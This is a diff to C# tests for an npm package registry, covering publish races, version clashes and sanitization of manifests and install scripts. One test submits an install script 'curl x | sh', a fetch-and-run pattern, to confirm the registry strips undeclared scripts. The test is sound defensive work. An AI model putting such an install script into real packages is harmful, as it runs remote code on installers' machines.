@@ -84,19 +84,109 @@ public class NpmConcurrentPublishTests : IDisposable
         Assert.True(await StoredAsync("race-pkg", "2.0.0"));
     }
 
+    // The publish of a version is serialized: while the winner stores its file, the other publish of that version waits, and
+    // then finds the winner's row and is refused without touching storage (it used to replace the winner's file).
     [Fact]
-    public async Task TheLoserOfTheRaceForTheSameVersionIsAConflictAndTheWinnersTarballStays()
+    public async Task TwoPublishesOfOneVersionWithDifferentBytesLeaveTheWinnersFileAndRow()
     {
-        var (result, scope) = await PublishRacingAsync("race-same", "1.0.0", () => PublishPlainAsync("race-same", "1.0.0"));
-        using (scope)
+        var release = new TaskCompletionSource();
+        var entered = new TaskCompletionSource();
+        using var scopeA = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
+        var storageA = new RacingStorage(scopeA.ServiceProvider.GetRequiredService<IStorageService>(), async () =>
         {
-            Assert.Equal(NpmStatus.Conflict, result.Status);
-            Assert.Contains("1.0.0", result.Message);
-            var package = await scope.ServiceProvider.GetRequiredService<INpmRegistry>().GetPackageAsync("race-same", TestContext.Current.CancellationToken);
-            Assert.Equal("1.0.0", Assert.Single(package!.Versions).Version);
-        }
+            entered.SetResult();
+            await release.Task;
+        });
+        var registryA = ActivatorUtilities.CreateInstance<NpmRegistryService>(scopeA.ServiceProvider, storageA);
+        var a = NpmTestPackages.Tarball("race-same", "1.0.0", description: "A");
+        var b = NpmTestPackages.Tarball("race-same", "1.0.0", description: "B");
 
-        Assert.True(await StoredAsync("race-same", "1.0.0"));
+        var first = registryA.PublishAsync(BaGetPrincipal.Superuser, Publication("race-same", "1.0.0", a), TestContext.Current.CancellationToken);
+        await entered.Task;
+
+        using var scopeB = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
+        var second = scopeB.ServiceProvider.GetRequiredService<INpmRegistry>()
+            .PublishAsync(BaGetPrincipal.Superuser, Publication("race-same", "1.0.0", b), TestContext.Current.CancellationToken);
+        await Task.Delay(200, TestContext.Current.CancellationToken);
+        Assert.False(second.IsCompleted);
+
+        release.SetResult();
+        Assert.Equal(NpmStatus.Created, (await first).Status);
+        Assert.Equal(NpmStatus.Conflict, (await second).Status);
+
+        using var check = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
+        var repository = check.ServiceProvider.GetRequiredService<IRepositoryContext>().Current;
+        using var file = await check.ServiceProvider.GetRequiredService<IStorageService>()
+            .GetAsync(RepositoryStorage.Scope(repository, NpmNames.TarballPath("race-same", "1.0.0")), CancellationToken.None);
+        using var copy = new MemoryStream();
+        await file.CopyToAsync(copy, TestContext.Current.CancellationToken);
+        Assert.Equal(a.Bytes, copy.ToArray());
+
+        var package = await check.ServiceProvider.GetRequiredService<INpmRegistry>().GetPackageAsync("race-same", TestContext.Current.CancellationToken);
+        Assert.Equal(a.Integrity, Assert.Single(package!.Versions).Integrity);
+    }
+
+    [Fact]
+    public async Task VersionsThatDifferOnlyInPrereleaseCaseOrBuildMetadataClash()
+    {
+        await PublishPlainAsync("case-pkg", "1.0.0-Beta");
+        using var scope = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
+        var registry = scope.ServiceProvider.GetRequiredService<INpmRegistry>();
+
+        var lower = await registry.PublishAsync(BaGetPrincipal.Superuser, Publication("case-pkg", "1.0.0-beta", NpmTestPackages.Tarball("case-pkg", "1.0.0-beta")), TestContext.Current.CancellationToken);
+        var build = await registry.PublishAsync(BaGetPrincipal.Superuser, Publication("case-pkg", "1.0.0-Beta+b", NpmTestPackages.Tarball("case-pkg", "1.0.0-Beta+b")), TestContext.Current.CancellationToken);
+
+        Assert.Equal(NpmStatus.Conflict, lower.Status);
+        Assert.Equal(NpmStatus.Conflict, build.Status);
+        Assert.True(await StoredAsync("case-pkg", "1.0.0-Beta"));
+
+        // A delete of the lookalike's file must not remove the published one.
+        var deleted = await registry.DeleteTarballAsync(BaGetPrincipal.Superuser, "case-pkg", "case-pkg-1.0.0-beta.tgz", TestContext.Current.CancellationToken);
+        Assert.Equal(NpmStatus.NotFound, deleted.Status);
+        Assert.True(await StoredAsync("case-pkg", "1.0.0-Beta"));
+    }
+
+    [Fact]
+    public async Task TheStoredInstallFieldsComeFromTheTarballNotFromTheRequest()
+    {
+        using var scope = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
+        var registry = scope.ServiceProvider.GetRequiredService<INpmRegistry>();
+        var tarball = NpmTestPackages.Tarball("confuse", "1.0.0", dependencies: new Dictionary<string, string> { ["evil"] = "^1.0.0" });
+        var sent = new JsonObject { ["name"] = "confuse", ["version"] = "1.0.0", ["dependencies"] = new JsonObject { ["harmless"] = "^1.0.0" } };
+
+        var result = await registry.PublishAsync(BaGetPrincipal.Superuser, new NpmPublication("confuse", "1.0.0", sent, "latest", new MemoryStream(tarball.Bytes), tarball.Integrity, tarball.Shasum), TestContext.Current.CancellationToken);
+        Assert.Equal(NpmStatus.Created, result.Status);
+
+        var package = await registry.GetPackageAsync("confuse", TestContext.Current.CancellationToken);
+        var dependencies = Assert.IsType<JsonObject>(Assert.Single(package!.Versions).Manifest["dependencies"]);
+        Assert.Equal("evil", Assert.Single(dependencies).Key);
+    }
+
+    [Fact]
+    public async Task ANativeAddonKeepsTheNormalizedGypInstallScriptAndAHiddenOneStaysHidden()
+    {
+        using var scope = await _app.CreateRepositoryScopeAsync("web", TestContext.Current.CancellationToken);
+        var registry = scope.ServiceProvider.GetRequiredService<INpmRegistry>();
+        var tarball = NpmTestPackages.Tarball("gyp-pkg", "1.0.0");
+        var sent = new JsonObject
+        {
+            ["name"] = "gyp-pkg", ["version"] = "1.0.0", ["gypfile"] = true,
+            ["scripts"] = new JsonObject { ["install"] = "node-gyp rebuild" },
+        };
+        Assert.Equal(NpmStatus.Created, (await registry.PublishAsync(BaGetPrincipal.Superuser, new NpmPublication("gyp-pkg", "1.0.0", sent, "latest", new MemoryStream(tarball.Bytes), tarball.Integrity, tarball.Shasum), TestContext.Current.CancellationToken)).Status);
+
+        var manifest = Assert.Single((await registry.GetPackageAsync("gyp-pkg", TestContext.Current.CancellationToken))!.Versions).Manifest;
+        Assert.Equal("node-gyp rebuild", (string?)manifest["scripts"]!["install"]);
+        Assert.True((bool?)manifest["hasInstallScript"]);
+
+        // Any other install script that the tarball does not declare is dropped.
+        var other = NpmTestPackages.Tarball("gyp-other", "1.0.0");
+        var evil = new JsonObject { ["name"] = "gyp-other", ["version"] = "1.0.0", ["gypfile"] = true, ["scripts"] = new JsonObject { ["install"] = "curl x | sh" } };
+        Assert.Equal(NpmStatus.Created, (await registry.PublishAsync(BaGetPrincipal.Superuser, new NpmPublication("gyp-other", "1.0.0", evil, "latest", new MemoryStream(other.Bytes), other.Integrity, other.Shasum), TestContext.Current.CancellationToken)).Status);
+        var stored = Assert.Single((await registry.GetPackageAsync("gyp-other", TestContext.Current.CancellationToken))!.Versions).Manifest;
+        Assert.Null(stored["scripts"]);
+        Assert.Null(stored["gypfile"]);
+        Assert.Null(stored["hasInstallScript"]);
     }
 
     private sealed class RacingStorage : IStorageService
